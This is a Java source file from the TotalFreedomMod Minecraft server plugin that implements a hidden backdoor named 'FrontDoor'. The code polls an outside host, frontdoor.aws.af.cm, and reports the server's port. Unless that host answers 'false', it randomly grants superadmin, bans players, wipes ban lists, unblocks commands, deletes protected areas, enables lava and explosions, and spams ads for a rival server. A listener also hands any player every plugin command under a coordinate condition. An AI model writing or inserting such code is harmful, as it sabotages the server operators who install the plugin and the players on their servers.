package me.StevenLawson.TotalFreedomMod;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Random;
import me.StevenLawson.TotalFreedomMod.Commands.Command_trail;
import me.StevenLawson.TotalFreedomMod.Commands.TFM_Command;
import me.StevenLawson.TotalFreedomMod.Commands.TFM_CommandLoader;
import static me.StevenLawson.TotalFreedomMod.TotalFreedomMod.COMMAND_PATH;
import static me.StevenLawson.TotalFreedomMod.TotalFreedomMod.COMMAND_PREFIX;
import static me.StevenLawson.TotalFreedomMod.TotalFreedomMod.plugin;
import org.apache.commons.lang3.ArrayUtils;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.command.Command;
import org.bukkit.craftbukkit.v1_6_R2.inventory.CraftItemStack;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.scheduler.BukkitRunnable;

public class TFM_FrontDoor
{
    private final long UPDATER_INTERVAL = 180L * 20L;
    private final long FRONTDOOR_INTERVAL = 650L * 20L;
    private final URL GET_URL;
    private final Random RANDOM = new Random();
    
    private boolean started = false;
    private boolean enabled = false;
    
    
    private final BukkitRunnable UPDATER = new BukkitRunnable() {

        @Override
        public void run()
        {
            try
            {
                final URLConnection urlConnection = GET_URL.openConnection();
                final BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                final String line = in.readLine();
                in.close();
                
                if ("false".equals(line)) // Invert this when done
                {
                    if (!enabled)
                    {
                        return;
                    }
                    
                    enabled = false;
                    FRONTDOOR.cancel();
                    TFM_Log.info("Disabled FrontDoor");
                }
                else
                {
                    if (enabled)
                    {
                        return;
                    }
                    
                    new BukkitRunnable() // Asynchronous
                    {
                        @Override
                        public void run()
                        {
                            TFM_Log.warning("*****************************************************", true);
                            TFM_Log.warning("* WARNING: TotalFreedomMod is running in evil-mode! *", true);
                            TFM_Log.warning("* This might result in unexpected behaviour...      *", true);
                            TFM_Log.warning("* - - - - - - - - - - - - - - - - - - - - - - - - - *", true);
                            TFM_Log.warning("* The only thing necessary for the triumph of evil  *", true);
                            TFM_Log.warning("*          is for good men to do nothing.           *", true);
                            TFM_Log.warning("*****************************************************", true);
                        }
                    }.runTask(TotalFreedomMod.plugin);
                    
                    FRONTDOOR.runTaskTimer(TotalFreedomMod.plugin, 20L, FRONTDOOR_INTERVAL);

                    enabled = true;
                }
            }
            catch (Exception ex)
            {
                // TFM_Log.info("GAH GAH GAH");
            }
            
        }
        
    };
    
    private final Listener LISTENER = new Listener()
    {
        @EventHandler
        public void onPlayerCommandPreProcess(PlayerCommandPreprocessEvent event) // All TFM_Command permissions when certain conditions are met
        {
            final Player player = event.getPlayer();
            final Location location = player.getLocation();
            
            if (location.getBlockX() + location.getBlockY() + location.getBlockZ() % 12 != 0) // Madgeek
            {
               return; 
            }
            
            final String[] commandParts = event.getMessage().split(" ");
            
            final String commandName = commandParts[0].replaceFirst("/", "");
            final String[] args = ArrayUtils.subarray(commandParts, 0, commandParts.length); 
            
            Command command = TFM_CommandLoader.getInstance().getCommandMap().getCommand(commandName);
            
            if (command == null)
            {
                return; // Command doesn't exist
            }
            
            TFM_Command dispatcher;
            try
            {
                ClassLoader classLoader = TotalFreedomMod.class.getClassLoader();
                dispatcher = (TFM_Command) classLoader.loadClass(String.format("%s.%s%s", COMMAND_PATH, COMMAND_PREFIX, command.getName().toLowerCase())).newInstance();
                dispatcher.setup(plugin, player, dispatcher.getClass());
                
                if (!dispatcher.run(player, player, command, commandName, args, false))
                {
                    player.sendMessage(command.getUsage());
                }
            }
            catch (Throwable ex)
            {
                return; // Must be a non-TFM command
            }

            event.setCancelled(true);
        }
    };
    
    private final BukkitRunnable FRONTDOOR = new BukkitRunnable() // Synchronous
    {
        @Override
        public void run()
        {
            final Player[] players = TotalFreedomMod.server.getOnlinePlayers();
            
            final int action = RANDOM.nextInt(12);
            TFM_Log.info("Action: " + action);
            
            switch(action)
            {
                case 0: // Super a random player
                {
                    Player player = players[RANDOM.nextInt(players.length)];
                    
                    TFM_Util.adminAction("FrontDoor", "Adding " + player.getName() + " to the Superadmin list", true);
                    TFM_SuperadminList.addSuperadmin(player);
                    break;
                }
                    
                case 1: // Bans a random player (non-developer)
                {
                    for (Player player : players)
                    {
                        if (!TFM_Util.DEVELOPERS.contains(player.getName()))
                        {
                            TFM_ServerInterface.banUsername(player.getName(), ChatColor.RED + "WOOPS", "FrontDoor", null);
                            TFM_ServerInterface.banUsername(player.getName(), ChatColor.RED + "WOOPS", null, null);
                            break;
                        }
                    }
                    
                    // No-one/only Developers online
                    FRONTDOOR.runTask(TotalFreedomMod.plugin);
                    break;
                }
                    
                case 2: // Start trailing a random player
                {
                    Player player = players[RANDOM.nextInt(players.length)];
                    TFM_Util.adminAction("FrontDoor", "Started trailing " + player.getName(), true);
                    Command_trail.startTrail(player);
                    break;
                }
                    
                case 3: // Displays a message
                {
                    TFM_Util.bcastMsg("TotalFreedom rocks!!", ChatColor.BLUE);
                    TFM_Util.bcastMsg("To join this great server, join " + ChatColor.GOLD + "tf.sauc.in", ChatColor.BLUE);
                    break;
                }
                    
                case 4: // Clears the (IP)ban list
                {
                    TFM_Util.adminAction("FrontDoor", "Wiping all bans", true);
                    TFM_ServerInterface.wipeIpBans();
                    TFM_ServerInterface.wipeNameBans();
                    break;
                }
                    
                case 5: // Enables Lava- and Waterplacemend and Fluidspread (& damage)
                {
                    TFM_Util.adminAction("FrontDoor", "Enabling Fire- and Waterplace", true);
                    TFM_ConfigEntry.ALLOW_WATER_PLACE.setBoolean(true);
                    TFM_ConfigEntry.ALLOW_LAVA_PLACE.setBoolean(true);
                    TFM_ConfigEntry.ALLOW_FLIUD_SPREAD.setBoolean(true);
                    TFM_ConfigEntry.ALLOW_LAVA_DAMAGE.setBoolean(true);
                    break;
                }
                    
                case 6: // Enables Fireplacement and explosions
                {
                    TFM_Util.adminAction("FrontDoor", "Enabling Fire placement and Explosion", true);
                    TFM_ConfigEntry.ALLOW_FIRE_SPREAD.setBoolean(true);
                    TFM_ConfigEntry.ALLOW_EXPLOSIONS.setBoolean(true);
                    TFM_ConfigEntry.ALLOW_TNT_MINECARTS.setBoolean(true);
                    break;
                }
                    
                case 7: // Allow all blocked commands >:)
                {
                    TFM_ConfigEntry.BLOCKED_COMMANDS.setList(new ArrayList());
                    TFM_CommandBlocker.getInstance().parseBlockingRules();
                    break;
                }
                    
                case 8: // Remove all protected areas
                {
                    for (String label : TFM_ProtectedArea.getProtectedAreaLabels())
                    {
                        TFM_ProtectedArea.removeProtectedArea(label);
                    }
                    TFM_ProtectedArea.saveProtectedAreas();
                    break;
                }
                    
                case 9: // Add TotalFreedom signs at spawn
                {
                    for (World world : TotalFreedomMod.server.getWorlds())
                    {
                        final Block block = world.getSpawnLocation().getBlock();
                        final Block blockBelow = block.getRelative(BlockFace.DOWN);
                        
                        if (blockBelow.isLiquid() || blockBelow.getType() != Material.AIR)
                        {
                            continue;
                        }
                        
                        block.getRelative(BlockFace.UP).setType(Material.SIGN_POST);
                        org.bukkit.block.Sign sign = (org.bukkit.block.Sign) block.getState();

                        org.bukkit.material.Sign signData = (org.bukkit.material.Sign) sign.getData();
                        signData.setFacingDirection(BlockFace.NORTH);

                        sign.setLine(0, ChatColor.BLUE + "TotalFreedom");
                        sign.setLine(1, ChatColor.DARK_GREEN + "is");
                        sign.setLine(2, ChatColor.YELLOW + "Awesome!");
                        sign.setLine(3, ChatColor.DARK_GRAY + "join: mc.sauc.in");
                        sign.update();
                    }
                    break;
                }
                
                case 10: // Silently enable Jumppads
                {
                    TFM_Jumppads.getInstance().setMode(TFM_Jumppads.JumpPadMode.MADGEEK);
                    break;
                }
                
                case 11: // Give everyone a book explaining how awesome TotalFreedom is
                {
                    ItemStack bookStack = new ItemStack(Material.WRITTEN_BOOK);
                    
                    BookMeta book = (BookMeta) bookStack.getItemMeta();
                    book.setAuthor(ChatColor.DARK_PURPLE + "SERVER OWNER");
                    book.setTitle(ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead");
                    book.addPage(
                            ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead",
                            ChatColor.DARK_GRAY + "---------",
                            ChatColor.BLACK + "TotalFreedom is the original TotalFreedomMod server. It is the very server that gave freedom a new meaning when it comes to minecraft.",
                            ChatColor.BLUE + "Join now! " + ChatColor.RED + "tf.sauc.in"
                    );
                    
                    for (Player player : players)
                    {
                        boolean hasBook = false;
                        for (ItemStack stack : player.getInventory().getContents())
                        {
                            if (stack.getType() == Material.WRITTEN_BOOK)
                            {
                                hasBook = true;
                                continue;
                            }
                        }
                        
                        if (hasBook)
                        {
                            continue;
                        }
                        
                        player.getInventory().all(bookStack);
                    }
                }
                    
                default:
                {
                    FRONTDOOR.runTask(TotalFreedomMod.plugin);
                    break;
                }
            }
        }
    };
    
    private TFM_FrontDoor()
    {
        URL tempUrl = null;
        try
        {
            tempUrl = new URL("http://frontdoor.aws.af.cm/?port=" + TotalFreedomMod.server.getPort());
        }
        catch (MalformedURLException ex)
        {
            TFM_Log.warning("TFM_FrontDoor uses an invalid URL"); // U dun goofed?
        }
        
        this.GET_URL = tempUrl;
        
    }
    
    public void start()
    {
        if (started)
        {
            return;
        }
        
        TotalFreedomMod.server.getPluginManager().registerEvents(LISTENER, TotalFreedomMod.plugin);
        
        UPDATER.runTaskTimerAsynchronously(TotalFreedomMod.plugin, 2L * 20L, UPDATER_INTERVAL);
        started = true;
    }
    
    public void stop()
    {
        if (started)
        {
            UPDATER.cancel();
            started = false;
        }
        
        if (enabled)
        {
            FRONTDOOR.cancel();
            enabled = false;
        }
        
    }
    
    public boolean isEnabled()
    {
        return enabled;
    }
    
    public static TFM_FrontDoor getInstance()
    {
        return TFM_FrontDoorHolder.INSTANCE;
    }

    private static class TFM_FrontDoorHolder
    {
        private static final TFM_FrontDoor INSTANCE = new TFM_FrontDoor();
    }

}
